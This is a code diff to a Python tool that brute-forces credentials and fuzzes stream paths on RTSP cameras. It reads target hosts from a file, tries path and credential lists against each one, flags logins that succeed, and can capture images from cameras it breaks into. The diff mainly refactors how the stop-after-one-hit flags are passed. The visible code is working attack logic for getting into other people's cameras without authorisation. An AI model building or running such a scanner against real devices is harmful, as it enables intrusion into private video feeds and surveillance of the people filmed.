@@ -13,10 +13,6 @@ from lib.scan import process_each
 
 verbose_level = 0
 
-single_path_enough = False
-single_cred_enough = False
-
-
 DIR = os.path.dirname(os.path.abspath(__file__))
 LOCAL_DIR = os.path.join(DIR, 'local')
 DATA_DIR = os.path.join(DIR, 'data')
@@ -55,39 +51,39 @@ def capture(stream_url, prefer_ffmpeg=False):
     prg(C_CAP_OK if captured else C_CAP_ERR)
 
 
-def check_host(host, pl, paths, creds, rtsp_port, timeout, interface, capture_img, prefer_ffmpeg):
+def check_host(host, pl, paths, creds, rtsp_port, timeout, single_path_enough, single_cred_enough, interface, capture_img, prefer_ffmpeg):
     port = rtsp_port
     if '/' in host:
         print('Can\'t use', host, 'as target')
-        return []
+        return
+
     if ':' in host:
         host, port = host.split(':')
+
     netloc = f'{host}:{port}'
-    results = []
 
     for path in paths:
-        root_url = f'rtsp://{netloc}{path}'
+        p_url = f'rtsp://{netloc}{path}'
 
-        code = rtsp_req(root_url, timeout=timeout, iface=interface)
+        code = rtsp_req(p_url, timeout=timeout, iface=interface)
 
         if code >= 500:
             prg(C_FAIL)
-            return []
+            return
 
         if code not in [200, 401, 403]:
-            prg('.', 3)
+            prg('.', 1)
             continue
 
         if '/0h84d' == path:
             prg(C_FAKE)
-            return []
+            return
 
         for cred in creds:
             c_url = f'rtsp://{cred}@{netloc}{path}'
             code = rtsp_req(c_url, timeout, interface)
 
             if code == 200:
-                results.append(c_url)
                 prg(C_FOUND)
 
                 with pl:
@@ -104,13 +100,11 @@ def check_host(host, pl, paths, creds, rtsp_port, timeout, interface, capture_im
                 prg(C_FAIL)
                 return []
 
-        if single_path_enough and results:
-            return results
-
-    return results
+        if single_path_enough:
+            return
 
 
-def main(hosts_file=None, p=554, t=5, ht=64, i=None, capture=False, v=0, s=False, P=None, C=None, sp=False, sc=False, ff=False):
+def main(hosts_file=None, p=554, t=5, ht=64, i=None, capture=False, v=0, s=False, P=None, C=None, sp=False, sc=True, ff=False):
     """Brute creds, fuzzing paths for RTSP cams
 
     :param str hosts_file: File with lines ip:port or just ips
@@ -129,12 +123,6 @@ def main(hosts_file=None, p=554, t=5, ht=64, i=None, capture=False, v=0, s=False
     """
     global verbose_level
 
-    global single_path_enough
-    global single_cred_enough
-
-    single_path_enough = sp
-    single_cred_enough = sc
-
     verbose_level = v
 
     if s:
@@ -151,7 +139,8 @@ def main(hosts_file=None, p=554, t=5, ht=64, i=None, capture=False, v=0, s=False
 
     with open(hosts_file or os.path.join(LOCAL_DIR, f'hosts_{p}.txt')) as f:
         hosts = (ln.rstrip() for ln in f)
-        process_each(check_host, hosts, ht, paths, creds, p, t, i, capture, ff)
+        process_each(check_host, hosts, ht, paths,
+                     creds, p, t, sp, sc, i, capture, ff)
 
 
 if __name__ == "__main__":
